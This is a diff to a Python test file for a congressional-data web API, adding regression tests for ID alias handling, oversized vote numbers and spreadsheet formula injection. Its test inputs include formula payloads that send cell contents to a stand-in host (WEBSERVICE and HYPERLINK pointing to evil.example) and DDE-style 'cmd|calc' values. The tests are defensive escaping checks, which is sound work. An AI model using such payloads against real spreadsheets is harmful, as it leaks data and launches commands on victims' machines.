@@ -91,6 +91,22 @@ async def test_invalid_bioguide_id_returns_400():
 
 
 @pytest.mark.asyncio
+@pytest.mark.parametrize("path", ["/api/members/%C5%BF000148/page", "/api/members/S000148%0A/page",
+                                  "/api/members/S%D9%A1%D9%A1%D9%A1148/page", "/api/members/detail/%C5%BF000148"])
+async def test_bioguide_aliases_are_refused_not_served_under_a_second_url(path):
+    """F044: fullmatch with ASCII digits, checked before .upper() ("ſ".upper() == "S"), so a
+    trailing newline, another script's digits or a case-fold alias is a 400, not S000148's payload."""
+    with _patch_data_dir():
+        _clear_data_service_cache()
+        async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
+            resp = await client.get(path)
+            canonical = await client.get("/api/members/S000148/page")
+    _clear_data_service_cache()
+    assert resp.status_code == 400
+    assert canonical.status_code == 200
+
+
+@pytest.mark.asyncio
 async def test_valid_bioguide_id_accepted():
     with _patch_data_dir():
         _clear_data_service_cache()
@@ -124,6 +140,16 @@ async def test_congress_out_of_range_returns_422():
     transport = ASGITransport(app=app)
     async with AsyncClient(transport=transport, base_url="http://test") as client:
         resp = await client.get("/api/bills/999/hr/1")
+    assert resp.status_code == 422
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize("chamber", ["house", "senate"])
+@pytest.mark.parametrize("number", ["9" * 300, "100000", "0", "-1"])
+async def test_vote_number_out_of_range_is_422_not_a_500(chamber, number):
+    """F068: a ~300-digit vote_number used to reach the file-name check and raise OSError."""
+    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
+        resp = await client.get(f"/api/votes/{chamber}/119/1/{number}")
     assert resp.status_code == 422
 
 
@@ -504,9 +530,12 @@ async def test_a_slow_write_does_not_stall_other_requests(stored, path, payload,
     ("/api/feedback",
      {"message": "=1+1", "page_url": '=WEBSERVICE("http://evil.example/?"&B2)', "page_type": "@x",
       "context_id": "+1", "context_label": " -1"},
-     ["'=1+1", '\'=WEBSERVICE("http://evil.example/?"&B2)', "'@x", "'+1", "' -1"]),
-    ("/api/notify", {"email": '=HYPERLINK("http://evil.example/?"&B3&"@a.co","Click")', "state": "OH"},
-     ['\'=HYPERLINK("http://evil.example/?"&B3&"@a.co","Click")', "OH"]),
+     # page_url and page_type never reach the sheet as sent: an off-site URL is "" and an
+     # unknown page type is "other" (F045).
+     ["'=1+1", "", "other", "'+1", "' -1"]),
+    # A HYPERLINK formula is no longer an email at all (F019 refuses it with a 422); "=" is
+    # still a legal local-part character, so a formula-shaped address remains possible.
+    ("/api/notify", {"email": "=1+1|calc!A0@x.co", "state": "OH"}, ["'=1+1|calc!A0@x.co", "OH"]),
     ("/api/notify", {"email": "+cmd|calc!A0@x.co", "state": "OH"}, ["'+cmd|calc!A0@x.co", "OH"]),
     ("/api/notify", {"email": "-2+3+cmd|calc!A0@x.co", "state": "OH"}, ["'-2+3+cmd|calc!A0@x.co", "OH"]),
 ])
